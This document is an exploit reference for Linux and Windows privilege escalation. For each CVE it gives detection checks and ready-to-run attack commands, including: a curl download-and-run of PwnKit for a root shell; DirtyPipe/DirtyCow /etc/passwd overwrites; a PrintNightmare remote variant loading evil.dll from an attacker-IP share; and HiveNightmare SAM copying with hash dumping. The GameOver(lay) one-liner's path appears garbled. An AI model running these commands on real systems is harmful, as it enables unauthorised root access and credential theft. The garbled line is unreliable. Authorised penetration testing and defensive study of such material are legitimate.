# Kernel Exploits Reference — Linux & Windows

> ⚠️ Kernel exploits can crash the target system. Always get explicit authorization before running.

---

## Linux Kernel Exploits

### Enumeration
```bash
# Kernel version
uname -r
uname -a
cat /proc/version

# Distribution info
cat /etc/os-release
lsb_release -a 2>/dev/null

# Automated suggester
./linux-exploit-suggester.sh
./linux-exploit-suggester.sh -k $(uname -r)
```

### DirtyPipe — CVE-2022-0847
**Affected:** Linux 5.8 — 5.16.11, 5.15.25, 5.10.102
```bash
# Detection
uname -r  # Check if 5.8 <= version <= 5.16.11

# Exploit (overwrites read-only files via pipe splice)
# Source: https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
gcc exploit.c -o dirtypipe
./dirtypipe /usr/bin/su  # Overwrites SUID binary to spawn root shell

# Alternative: overwrite /etc/passwd
./dirtypipe /etc/passwd 1 "${hacked_line}"
```

### DirtyCow — CVE-2016-5195
**Affected:** Linux 2.6.22 — 4.8.3 (October 2016)
```bash
# Detection
uname -r  # Very old kernels

# Exploit variants:
# 1. /etc/passwd overwrite (most stable)
# Source: https://github.com/firefart/dirtycow
gcc -pthread dirty.c -o dirty -lcrypt
./dirty <new_password>
# Creates user "firefart" with root privileges
su firefart

# 2. SUID binary overwrite
# Source: https://github.com/dirtycow/dirtycow.github.io
gcc -pthread cowroot.c -o cowroot
./cowroot
```

### PwnKit — CVE-2021-4034
**Affected:** Virtually all Linux distributions with polkit pkexec installed (2009-2022)
```bash
# Detection
pkexec --version  # Vulnerable if polkit < 0.120 (or distro-specific patch)
ls -la /usr/bin/pkexec  # Check if SUID

# Exploit (extremely reliable)
# Source: https://github.com/ly4k/PwnKit
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
chmod +x PwnKit
./PwnKit  # Instant root shell

# Alternative (compile from source):
# Source: https://github.com/berdav/CVE-2021-4034
make
./cve-2021-4034
```

### Baron Samedit — CVE-2021-3156
**Affected:** sudo 1.8.2 — 1.8.31p2, 1.9.0 — 1.9.5p1
```bash
# Detection
sudo --version
# Vulnerable if < 1.9.5p2

# Quick test (non-destructive):
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
# If it crashes/segfaults → likely vulnerable
# If "usage:" error → patched

# Exploit:
# Source: https://github.com/blasty/CVE-2021-3156
make
./sudo-hax-me-a-sandwich <target_id>
# target_id depends on OS/version — tool lists options
```

### OverlayFS — CVE-2023-0386
**Affected:** Linux 5.11 — 6.2 (before patches)
```bash
# Detection
uname -r  # Check range
cat /proc/filesystems | grep overlay

# Exploit:
# Source: https://github.com/xkaneiki/CVE-2023-0386
make all
# Terminal 1:
./fuse ./ovlcap/lower ./gc
# Terminal 2:
./exp
```

### Netfilter — CVE-2022-25636
**Affected:** Linux 5.4 — 5.6.10
```bash
# Detection
uname -r
lsmod | grep nf_tables

# Exploit: heap out-of-bounds write in nf_tables
# Source: https://github.com/Bonfee/CVE-2022-25636
make
./exploit
```

### GameOver(lay) — CVE-2023-2640 / CVE-2023-32629
**Affected:** Ubuntu kernels (OverlayFS Ubuntu-specific patches)
```bash
# Detection — Ubuntu specific
uname -r
cat /etc/os-release | grep Ubuntu

# One-liner PoC:
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p]]*3teleprompter l/;
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("id")'
```

### Looney Tunables — CVE-2023-4911
**Affected:** glibc 2.34 — 2.38 (most major distros in 2023)
```bash
# Detection
ldd --version  # Check glibc version

# Exploit: buffer overflow in ld.so GLIBC_TUNABLES
# Source: https://github.com/leesh3288/CVE-2023-4911
python3 gen_libc.py
./exp
```

---

## Windows Kernel Exploits

### Enumeration
```powershell
# System information
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Hotfix"

# Automated suggester
python3 windows-exploit-suggester.py --update
python3 windows-exploit-suggester.py --database <db.xlsx> --systeminfo sysinfo.txt

# PowerShell alternative
powershell -ep bypass -c "Import-Module .\Sherlock.ps1; Find-AllVulns"
```

### PrintNightmare — CVE-2021-1675 / CVE-2021-34527
**Affected:** Windows 7 — 11, Server 2008 — 2022 (unpatched)
```powershell
# Detection
Get-Service Spooler | Select Status
# Check if Print Spooler is running

# Local Privilege Escalation variant:
# Source: https://github.com/calebstewart/CVE-2021-1675
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "P@ssw0rd123!" -DriverName "PrintMe"
# Adds user to local administrators

# Remote variant (RCE):
# From Linux attacker:
python3 CVE-2021-1675.py domain.local/user:password@<target> '\\<attacker_ip>\share\evil.dll'
```

### HiveNightmare / SeriousSAM — CVE-2021-36934
**Affected:** Windows 10 versions 1809-21H1
```powershell
# Detection — check if SAM has shadow copies with world-readable ACLs
icacls C:\Windows\System32\config\SAM
# If BUILTIN\Users has (I)(RX) → vulnerable

# Exploit:
# List shadow copies
vssadmin list shadows
# Or create one:
wmic shadowcopy call create Volume='C:\'

# Copy SAM/SYSTEM/SECURITY from shadow
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system

# Extract hashes
secretsdump.py -sam sam -system system LOCAL
```

### EternalBlue Local — MS17-010
**Affected:** Windows 7, Server 2008 R2 (unpatched)
```powershell
# Detection
nmap -p 445 --script smb-vuln-ms17-010 <target>
# Or check installed patches:
wmic qfe | findstr KB4013389

# Exploit (local privilege escalation via named pipe):
# Usually exploited remotely, but local variant exists for privesc
# Use Metasploit: exploit/windows/local/ms17_010_eternalblue_win8
```

### KrbRelayUp
**Affected:** Domain-joined Windows (requires LDAP signing not enforced)
```powershell
# Local privesc via Kerberos relay
.\KrbRelayUp.exe relay -Domain domain.local -CreateNewComputerAccount -ComputerName YOURPC$ -ComputerPassword P@ss
.\KrbRelayUp.exe spawn -m rbcd -d domain.local -dc dc.domain.local -cn YOURPC$ -cp P@ss
```

---

## Exploit Selection Checklist

1. **Identify kernel version** (`uname -r` / `systeminfo`)
2. **Run automated suggester** (linux-exploit-suggester / windows-exploit-suggester)
3. **Cross-reference** with known exploits above
4. **Check exploit stability** — prefer reliable exploits (PwnKit > DirtyCow)
5. **Test in lab first** if possible
6. **Get explicit authorization** before running
7. **Have a backup plan** — kernel exploits can crash the system
8. **Capture proof immediately** — `id`, `whoami /all`

## Exploit Reliability Tiers
```
TIER 1 (Very Reliable):    PwnKit, Baron Samedit, PrintSpoofer, GodPotato
TIER 2 (Reliable):         DirtyPipe, PrintNightmare, HiveNightmare, OverlayFS
TIER 3 (Use with Caution): DirtyCow, EternalBlue, Netfilter, KrbRelayUp
TIER 4 (Unstable/Risky):   Custom kernel exploits, race conditions
```
